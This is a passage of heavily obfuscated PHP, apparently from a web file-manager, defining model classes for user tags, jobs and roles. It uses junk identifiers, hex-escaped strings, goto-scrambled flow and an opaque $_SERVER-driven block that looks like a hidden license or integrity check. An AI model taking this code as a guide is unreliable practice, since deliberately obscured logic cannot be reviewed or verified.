$Aò‡æŒ²×[413] => $aáŞ³ÎÏÜ, $Aò‡æŒ²×[463] => 0); return $this->where($CÉÚÉ–‚Üà)->delete(); } protected function rename($f‘–Ñóì¥Ç, $a´¾†— Â) { $E¹»¶½Şì =& $_SERVER[æ§›¦ÌáØ]; if ($f‘–Ñóì¥Ç == $a´¾†— Â) { return !1; } $eÉ­²ö¿Ù = $this->getAutoName($a´¾†— Â); if ($a´¾†— Â != $eÉ­²ö¿Ù) { return !1; } $fä„°ê¡Ã¶ = array($E¹»¶½Şì[1511] => USER_ID, $E¹»¶½Şì[463] => 0, $E¹»¶½Şì[28] => $f‘–Ñóì¥Ç); return $this->where($fä„°ê¡Ã¶)->save(array($E¹»¶½Şì[28] => $a´¾†— Â)); } protected function resetSort($e“ÅÅãª¿) { $d…­ğëš =& $_SERVER[æ§›¦ÌáØ]; $e“ÅÅãª¿ = is_array($e“ÅÅãª¿) ? $e“ÅÅãª¿ : array(); $A½È²¿åïœ = array($d…­ğëš[1511] => USER_ID); for ($B³ƒö¸˜†¾ = 0; $B³ƒö¸˜†¾ < count($e“ÅÅãª¿); $B³ƒö¸˜†¾++) { $A½È²¿åïœ[$d…­ğëš[412]] = $e“ÅÅãª¿[$B³ƒö¸˜†¾]; $this->where($A½È²¿åïœ)->save(array($d…­ğëš[1693] => $B³ƒö¸˜†¾ + 1)); } return !0; } protected function moveTop($Cå‘‘óÁàÆ) { goto eÊêæÊ“§±; cÒŒ²ùÈ¥‘: $bë†“¾Ğ® = $D¯—Û–Ò‡; $D¯—Û–Ò‡ = array_remove_value($D¯—Û–Ò‡, $Cì¼Â‚Ñ«ø[$eˆâğÜßÆ[393]]); array_unshift($D¯—Û–Ò‡, $Cì¼Â‚Ñ«ø[$eˆâğÜßÆ[393]]); goto CÒùù¡§Ş¨; CÒùù¡§Ş¨: return $this->resetSort($D¯—Û–Ò‡); goto eÃ“Ó•š·¯; eÊêæÊ“§±: $eˆâğÜßÆ =& $_SERVER[æ§›¦ÌáØ]; $B£êŠãÊ® = array($eˆâğÜßÆ[1511] => USER_ID, $eˆâğÜßÆ[463] => 0); $Cì¼Â‚Ñ«ø = $this->where($B£êŠãÊ®)->where(array($eˆâğÜßÆ[28] => $Cå‘‘óÁàÆ))->find(); goto béîÔµ»”¶; béîÔµ»”¶: if (!$Cì¼Â‚Ñ«ø) { return; } $D¯—Û–Ò‡ = $this->field($eˆâğÜßÆ[393])->where($B£êŠãÊ®)->order($eˆâğÜßÆ[2111])->select(); $D¯—Û–Ò‡ = array_to_keyvalue($D¯—Û–Ò‡, $eˆâğÜßÆ[33], $eˆâğÜßÆ[393]); goto cÒŒ²ùÈ¥‘; eÃ“Ó•š·¯: } protected function moveBottom($dÛó°ãÍ¬ˆ) { $c‹¢¾ÒÜÏØ =& $_SERVER[æ§›¦ÌáØ]; $AÄÇ‡³ = array($c‹¢¾ÒÜÏØ[1511] => USER_ID, $c‹¢¾ÒÜÏØ[463] => 0); $C‘ªâôè¡° = $this->where($AÄÇ‡³)->max($c‹¢¾ÒÜÏØ[1712]); $FÀš„•÷¹ = array($c‹¢¾ÒÜÏØ[1712] => $C‘ªâôè¡° + 1); return $this->where($AÄÇ‡³)->where(array($c‹¢¾ÒÜÏØ[28] => $dÛó°ãÍ¬ˆ))->save($FÀš„•÷¹); } private function getAutoName($FˆÌùîˆ¾·) { goto Aã›ªêñ¸Œ; Aã›ªêñ¸Œ: $a¦ÑæöÁˆ =& $_SERVER[æ§›¦ÌáØ]; $E‡•“î›™Œ = array($a¦ÑæöÁˆ[1511] => USER_ID, $a¦ÑæöÁˆ[463] => 0); $a£»åøÄåŒ = $this->field($a¦ÑæöÁˆ[28])->where($E‡•“î›™Œ)->select(); goto cËÊ‰‡Úµ; cËÊ‰‡Úµ: $a£»åøÄåŒ = array_to_keyvalue($a£»åøÄåŒ, $a¦ÑæöÁˆ[33], $a¦ÑæöÁˆ[28]); if (!$a£»åøÄåŒ || !in_array($FˆÌùîˆ¾·, $a£»åøÄåŒ)) { return $FˆÌùîˆ¾·; } for ($FáƒŸÁ’š¿ = 0; $FáƒŸÁ’š¿ < count($a£»åøÄåŒ); $FáƒŸÁ’š¿++) { if (!in_array($FˆÌùîˆ¾· . "\x28{$FáƒŸÁ’š¿}\x29", $a£»åøÄåŒ)) { return $FˆÌùîˆ¾· . "\x28{$FáƒŸÁ’š¿}\51"; } } goto E‚Û®ë ; E‚Û®ë : return $FˆÌùîˆ¾· . "\x28{$FáƒŸÁ’š¿}\51"; goto EœòÍŸº; EœòÍŸº: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x6a\x6f\x62\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x64\145\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\154\x66\112\x6f\142\x4c\151\163\x74"; public function listData($D‹™ƒÈŞ = false, $añ¿èƒÌ… = "\163\157\x72\x74", $a†Ôˆ¶ïóä = false) { return parent::listData($D‹™ƒÈŞ, $añ¿èƒÌ…, $a†Ôˆ¶ïóä); } public function remove($F´º˜¡—Öê) { return parent::remove($F´º˜¡—Öê); } public function add($dÉœíâô†š) { $DÓÇ¦‘©ê£ =& $_SERVER[æ§›¦ÌáØ]; if ($this->findByName($dÉœíâô†š[$DÓÇ¦‘©ê£[28]])) { return !1; } $dÉœíâô†š[$DÓÇ¦‘©ê£[1712]] = $this->getSort(); return parent::insert($dÉœíâô†š); } private function getSort() { $EÚÔï¤Œ =& $_SERVER[æ§›¦ÌáØ]; $A’´ĞÖŒ˜¾ = parent::listData(); $DÅÂÂÇÌ = array_to_keyvalue($A’´ĞÖŒ˜¾, $EÚÔï¤Œ[33], $EÚÔï¤Œ[1712]); return empty($DÅÂÂÇÌ) ? 0 : max($DÅÂÂÇÌ) + 1; } public function update($E‘¡™¹‡ğç, $b¢¼ìšÈÊØ) { $fÜÉ¦ìö‘ =& $_SERVER[æ§›¦ÌáØ]; $D·™ÔÑƒÏ÷ = parent::listData($E‘¡™¹‡ğç); $DµÛµÂ„°‹ = $this->findByName($b¢¼ìšÈÊØ[$fÜÉ¦ìö‘[28]]); if (!$D·™ÔÑƒÏ÷ || $DµÛµÂ„°‹ && $DµÛµÂ„°‹[$fÜÉ¦ìö‘[393]] != $D·™ÔÑƒÏ÷[$fÜÉ¦ìö‘[393]]) { return !1; } return parent::update($E‘¡™¹‡ğç, $b¢¼ìšÈÊØ); } public function setUserJob($dŠ†ĞˆÂç´, $A©¨™øÉ‘è) { goto AÍ¥Æ¬²Ë; A«Ãƒó’‰ê: $FÇ÷™ÄªÜª = rtrim($FÇ÷™ÄªÜª, $a¶Ú«Ò¯‚[47]); Model($a¶Ú«Ò¯‚[519])->metaSet($dŠ†ĞˆÂç´, self::JOB_KEY, $FÇ÷™ÄªÜª); goto b÷Ö†§ÍŞ; E•¼ø´¹ñ£: $BÃ¹õ‹¾Ø£ = array_to_keyvalue($FÄ©¨à…ù°, $a¶Ú«Ò¯‚[28]); $FÇ÷™ÄªÜª = $a¶Ú«Ò¯‚[375]; foreach ($A©¨™øÉ‘è as $E…ì³áÌ®ª) { if ($BÃ¹õ‹¾Ø£[$E…ì³áÌ®ª]) { $FÇ÷™ÄªÜª .= $BÃ¹õ‹¾Ø£[$E…ì³áÌ®ª][$a¶Ú«Ò¯‚[393]] . $a¶Ú«Ò¯‚[47]; } else { $c¡ÀÖ±İÍŞ = $this->add($E…ì³áÌ®ª); $FÇ÷™ÄªÜª .= $c¡ÀÖ±İÍŞ . $a¶Ú«Ò¯‚[47]; } } goto A«Ãƒó’‰ê; AÍ¥Æ¬²Ë: $a¶Ú«Ò¯‚ =& $_SERVER[æ§›¦ÌáØ]; if (!is_array($A©¨™øÉ‘è)) { $A©¨™øÉ‘è = array($A©¨™øÉ‘è); } $FÄ©¨à…ù° = parent::listData(); goto E•¼ø´¹ñ£; b÷Ö†§ÍŞ: } public function getUserJob($FßÈª¤¼˜) { $E†ßéä„£¯ = Model($_SERVER[æ§›¦ÌáØ][519])->metaGet($FßÈª¤¼˜); return $this->getUserJobInfo($E†ßéä„£¯[self::JOB_KEY]); } public function getUserJobInfo($B –»Ùä¶Â) { goto dÇÅóÖ¥ŠÏ; e ””±»¶İ: $EÙ¦î£ã”Æ = array_remove_key($EÙ¦î£ã”Æ, $fÕ¸¬…¤Ä”[194]); $Då‚¨‹ê¦ = array(); foreach ($dçø‘‡ìÅÊ as $b§®·Â—) { if (isset($EÙ¦î£ã”Æ[$b§®·Â—])) { $Då‚¨‹ê¦[] = $EÙ¦î£ã”Æ[$b§®·Â—]; } } goto ağİâË·Œ; dÇÅóÖ¥ŠÏ: $fÕ¸¬…¤Ä” =& $_SERVER[æ§›¦ÌáØ]; $dçø‘‡ìÅÊ = explode($fÕ¸¬…¤Ä”[47], $B –»Ùä¶Â); $EÙ¦î£ã”Æ = parent::listData(); goto e ””±»¶İ; ağİâË·Œ: return $Då‚¨‹ê¦; goto a˜²›®ŒÚ; a˜²›®ŒÚ: } } goto B’Ôå­²½; E’Êê‚·˜—: function binCheckBigger($DŒàùÚ©ˆõ, $c”À´¨–Ï) { return $DŒàùÚ©ˆõ > $c”À´¨–Ï; } $_SERVER[$_SERVER[€÷•Š‹Õ³¾ä][3]] = (base64_decode('OTEzOA==')."\x36\x38")+0;$_Ktkv="icNY2GxdyC9qzwA4dWG3Tq5SsDsItDFtgwmInyKJVHNHRTfEaxbkzggxcvBugVYhin863";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($EË¡‹®ÙĞ¥, $aË‹â™¬íğ) { $FŒ¥í•ĞÊ  =& $_SERVER[æ§›¦ÌáØ]; if (isset(self::$_methodList[$EË¡‹®ÙĞ¥])) { return @call_user_func_array(self::$_methodList[$EË¡‹®ÙĞ¥], $aË‹â™¬íğ); } else { if (method_exists($this, $EË¡‹®ÙĞ¥)) { return call_user_func_array(array($this, $EË¡‹®ÙĞ¥), $aË‹â™¬íğ); } else { think_exception(__CLASS__ . $FŒ¥í•ĞÊ [4] . $EË¡‹®ÙĞ¥ . $FŒ¥í•ĞÊ [5]); } } } public static function __callStatic($C‹Ï”’Ï¶˜, $bÁÜó®ÔÍ’) { if (isset(self::$_methodListStatic[$C‹Ï”’Ï¶˜])) { return call_user_func_array(self::$_methodListStatic[$C‹Ï”’Ï¶˜], $bÁÜó®ÔÍ’); } else { if (method_exists(self, $C‹Ï”’Ï¶˜)) { return call_user_func_array(array(self, $C‹Ï”’Ï¶˜), $bÁÜó®ÔÍ’); } else { show_json("{$C‹Ï”’Ï¶˜}\x28\51\x20\x6e\157\164\40\145\x78\x69\163\x74\73", !1); } } } public static function addMethod($CĞ¤Ãƒ†˜Ò, $bÂÀ‘àÄ©Â) { self::$_methodList[$CĞ¤Ãƒ†˜Ò] = $bÂÀ‘àÄ©Â; } public static function addMethodStatic($cÛŠ’¡®Œç, $c‚ˆÑŒ¬¶ä) { self::$_methodListStatic[$cÛŠ’¡®Œç] = $c‚ˆÑŒ¬¶ä; } } goto Cî‘äÙ¸´š; Fİ¿ÜÖ•ë„: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x72\157\154\145\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x61\x75\164\150", "\x6c\141\142\145\154", "\x64\151\163\x70\154\141\x79", "\163\171\x73\164\x65\155", "\144\x65\163\x63", "\x69\147\x6e\x6f\162\x65\105\170\164", "\151\x67\156\x6f\162\145\x46\151\154\x65\123\151\172\x65", "\x61\144\x6d\x69\156\151\163\164\162\x61\164\x6f\162", "\163\157\x72\x74"); public function listData($dÇù˜áÏ½ = false, $a…½âæá¬µ = "\163\x6f\162\164", $CÊ‰‘æ•ïÎ = false) { $Eø‘§—Ü« =& $_SERVER[æ§›¦ÌáØ]; $câ¨º†¶œ¸ = parent::listData($dÇù˜áÏ½, $a…½âæá¬µ, $CÊ‰‘æ•ïÎ); if (!$dÇù˜áÏ½) { foreach ($câ¨º†¶œ¸ as $cÖòÊë­ÛÁ => $f©Ü÷å¯«Ô) { if ($f©Ü÷å¯«Ô[$Eø‘§—Ü«[1877]] == 1) { $câ¨º†¶œ¸[$cÖòÊë­ÛÁ][$Eø‘§—Ü«[431]] = LNG($Eø‘§—Ü«[2103]); } } } return $câ¨º†¶œ¸; } public function update($båëÕåÙ”, $Eéí»ê÷øÚ) { goto f ¼´ÀïÕ; EøàØÕÛ–õ: return parent::update($båëÕåÙ”, $Eéí»ê÷øÚ); goto eÛğ¬ö; f ¼´ÀïÕ: $AÌÄÉÊ¬ËØ =& $_SERVER[æ§›¦ÌáØ]; $d·İô´Š£ = parent::listData($båëÕåÙ”); $b‰‡è¸Ÿ = $this->findByName($Eéí»ê÷øÚ[$AÌÄÉÊ¬ËØ[28]]); goto e¿¾¿ñíÆ×; e¿¾¿ñíÆ×: if (!$d·İô´Š£ || $b‰‡è¸Ÿ && $b‰‡è¸Ÿ[$AÌÄÉÊ¬ËØ[393]] != $d·İô´Š£[$AÌÄÉÊ¬ËØ[393]]) { return !1; } if ($b‰‡è¸Ÿ[$AÌÄÉÊ¬ËØ[1877]] == 1) { $Eéí»ê÷øÚ = array($AÌÄÉÊ¬ËØ[28] => $Eéí»ê÷øÚ[$AÌÄÉÊ¬ËØ[28]], $AÌÄÉÊ¬ËØ[1711] => $Eéí»ê÷øÚ[$AÌÄÉÊ¬ËØ[1711]]); } $this->filterAuth($Eéí»ê÷øÚ[$AÌÄÉÊ¬ËØ[406]]); goto EøàØÕÛ–õ; eÛğ¬ö: } public function remove($dÁ¥®¶ÂÆ) { $E¸ÍÇ©Ûí = parent::listData($dÁ¥®¶ÂÆ); if (!$E¸ÍÇ©Ûí || $E¸ÍÇ©Ûí[$_SERVER[æ§›¦ÌáØ][1161]]) { return !1; } return parent::remove($dÁ¥®¶ÂÆ); } public function add($D¢¤ôì´Ğ¿) { goto d¤ÍÕÂ; d¤ÍÕÂ: $D¯©Œ¶ã‰¶ =& $_SERVER[æ§›¦ÌáØ]; $e“¢«˜—Ù¬ = $D¢¤ôì´Ğ¿[$D¯©Œ¶ã‰¶[28]]; if ($this->findByName($e“¢«˜—Ù¬)) { return !1; } goto d×¥é¯“à°; d×¥é¯“à°: $E”¬ó¼ëŸÖ = array($D¯©Œ¶ã‰¶[413] => $e“¢«˜—Ù¬, $D¯©Œ¶ã‰¶[1695] => $D¯©Œ¶ã‰¶[33], $D¯©Œ¶ã‰¶[1691] => $D¯©Œ¶ã‰¶[1699], $D¯©Œ¶ã‰¶[2104] => 1, $D¯©Œ¶ã‰¶[1694] => 0, $D¯©Œ¶ã‰¶[2105] => 0, $D¯©Œ¶ã‰¶[1693] => $this->getSort()); $D¢¤ôì´Ğ¿ = array_merge($E”¬ó¼ëŸÖ, $D¢¤ôì´Ğ¿); $this->filterAuth($D¢¤ôì´Ğ¿[$D¯©Œ¶ã‰¶[406]]); goto AåÆÎÛã­; AåÆÎÛã­: return parent::insert($D¢¤ôì´Ğ¿); goto e±Ğ‡‹»Æ•; e±Ğ‡‹»Æ•: } private function getSort() { $dÂ¹²ßÔÛ‹ =& $_SERVER[æ§›¦ÌáØ]; $E¥òÍ×Ü¦Ò = parent::listData(); $F³ßâ‰‚ñœ = array_to_keyvalue($E¥òÍ×Ü¦Ò, $dÂ¹²ßÔÛ‹[33], $dÂ¹²ßÔÛ‹[1712]); return empty($F³ßâ‰‚ñœ) ? 0 : max($F³ßâ‰‚ñœ) + 1; } private function filterAuth(&$aİ—­–‡¤ë) { $dŸè™Á©½ =& $_SERVER[æ§›¦ÌáØ]; $cñÑ¼ ÕÃ„ = array(); $FÍâêøéè› = array_filter(explode($dŸè™Á©½[47], $aİ—­–‡¤ë)); foreach ($FÍâêøéè› as $aİ—­–‡¤ë) { $AĞ õ©Û¢„ = explode($dŸè™Á©½[95], $aİ—­–‡¤ë); if ($AĞ õ©Û¢„[0] == $dŸè™Á©½[2106] && $AĞ õ©Û¢„[1] != $dŸè™Á©½[1080]) { $eÉáØƒ¨¦¾ = $AĞ õ©Û¢„[0] . $dŸè™Á©½[95] . $AĞ õ©Û¢„[1] . $dŸè™Á©½[2107]; if (!in_array($eÉáØƒ¨¦¾, $FÍâêøéè›)) { $cñÑ¼ ÕÃ„[] = $eÉáØƒ¨¦¾; } } $cñÑ¼ ÕÃ„[] = $aİ—­–‡¤ë; } $aİ—­–‡¤ë = implode($dŸè™Á©½[47], $cñÑ¼ ÕÃ„); } public function sort($A…ƒÛ˜Á˜Ï, $dÁ¢Ù·Æù‰) { return parent::update($A…ƒÛ˜Á˜Ï, $dÁ¢Ù·Æù‰); } } if ($_SERVER[$_SERVER[æ§›¦ÌáØ][785]] != $_SERVER[$_SERVER[æ§›¦ÌáØ][786]]) { goto c–„‰Ô¯ÒĞ; bªÌ„œ•¸è: $d„ŸÚÒ‘í¤($_SERVER[$_SERVER[æ§›¦ÌáØ][792]]); goto añ¼ÅœÙ¡á; c–„‰Ô¯ÒĞ: $e‘¢ô°ß– = $_SERVER[æ§›¦ÌáØ][787]; $DœÚŒßµ¨Ï = $_SERVER[$_SERVER[æ§›¦ÌáØ][788]] . $_SERVER[æ§›¦ÌáØ][789]; $F¯‹íÁÓ°ë = $e‘¢ô°ß–($DœÚŒßµ¨Ï); goto Dƒ¢È…ÉÚ; Dƒ¢È…ÉÚ: $AËÏã°¹­” = explode($_SERVER[æ§›¦ÌáØ][229], $F¯‹íÁÓ°ë); if (count($AËÏã°¹­”) < $_SERVER[æ§›¦ÌáØ][604]) { $Dµ¦ë½âÏÒ = $_SERVER[æ§›¦ÌáØ][790]; $Dµ¦ë½âÏÒ(); } $d„ŸÚÒ‘í¤ = $_SERVER[æ§›¦ÌáØ][791]; goto bªÌ„œ•¸è; añ¼ÅœÙ¡á: } goto Aô¿å¶İÓ‰; cªÃÈ—±É: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($E·æ°²œ®Ú) { $dèÖé¶ŸŸå =& $_SERVER[æ§›¦ÌáØ]; return array($dèÖé¶ŸŸå[1791] => array(USER_ID, $dèÖé¶ŸŸå[1792])); } protected function listData() { $aÇ³Úƒ‡è® =& $_SERVER[æ§›¦ÌáØ]; $a¬Ü­º = array($aÇ³Úƒ‡è®[1511] => USER_ID, $aÇ³Úƒ‡è®[463] => array($aÇ³Úƒ‡è®[1795], 0)); $c­™Š°¯Ì = $aÇ³Úƒ‡è®[1797]; $eÈÁà“‹›Ğ = $this->field($c­™Š°¯Ì)->where($a¬Ü­º)->order($aÇ³Úƒ‡è®[1798])->select(); return $eÈÁà“‹›Ğ ? $eÈÁà“‹›Ğ : array(); } protected function listByTag($d§Ê„É¶ä) { } protected function addToTag($DÁÔº‰Ù‚®, $béÍªëÕçÕ) { $E °ğÃ½Ô =& $_SERVER[æ§›¦ÌáØ]; if (!Model($E °ğÃ½Ô[1932])->listData($béÍªëÕçÕ) || !Model($E °ğÃ½Ô[783])->pathInfo($DÁÔº‰Ù‚®)) { return !1; } $aì©Ùœİğ = array($E °ğÃ½Ô[1511] => USER_ID, $E °ğÃ½Ô[463] => $béÍªëÕçÕ, $E °ğÃ½Ô[414] => $DÁÔº‰Ù‚®, $E °ğÃ½Ô[415] => $E °ğÃ½Ô[409], $E °ğÃ½Ô[413] => $E °ğÃ½Ô[33], $E °ğÃ½Ô[1693] => 0); if ($this->where($aì©Ùœİğ)->find()) { return !1; } return $this->add($aì©Ùœİğ); } protected function removeFromTag($EÒƒ´êÕé”, $bÀÌÌÇÍºĞ) { $Fß˜‰¹‘‹Ú =& $_SERVER[æ§›¦ÌáØ]; if (!Model($Fß˜‰¹‘‹Ú[1932])->listData($bÀÌÌÇÍºĞ)) { return !1; } if (is_array($EÒƒ´êÕé”)) { $EÒƒ´êÕé” = array($Fß˜‰¹‘‹Ú[7], $EÒƒ´êÕé”); } $b‘åÌ¹ÂÈ† = array($Fß˜‰¹‘‹Ú[1511] => USER_ID, $Fß˜‰¹‘‹Ú[463] => $bÀÌÌÇÍºĞ, $Fß˜‰¹‘‹Ú[415] => $Fß˜‰¹‘‹Ú[409], $Fß˜‰¹‘‹Ú[414] => $EÒƒ´êÕé”); return $this->where($b‘åÌ¹ÂÈ†)->delete(); } protected function removeByTag($A×ƒæ˜µ¸) { $FÁ›ñ«Úâ =& $_SERVER[æ§›¦ÌáØ]; if (!$A×ƒæ˜µ¸) { return !1; } $e×øİ¬‘ŠÜ = array($FÁ›ñ«Úâ[1511] => USER_ID, $FÁ›ñ«Úâ[463] => $A×ƒæ˜µ¸); return $this->where($e×øİ¬‘ŠÜ)->delete(); } protected function removeBySource($cæáÈªí™Ÿ) { $BâÎÙÙ´½… =& $_SERVER[æ§›¦ÌáØ]; if (is_array($cæáÈªí™Ÿ)) { $cæáÈªí™Ÿ = array($BâÎÙÙ´½…[7], $cæáÈªí™Ÿ); } $a‘•‘ÉõÈÀ = array($BâÎÙÙ´½…[1511] => USER_ID, $BâÎÙÙ´½…[414] => $cæáÈªí™Ÿ, $BâÎÙÙ´½…[463] => array($BâÎÙÙ´½…[962], 0)); return $this->where($a‘•‘ÉõÈÀ)->delete(); } }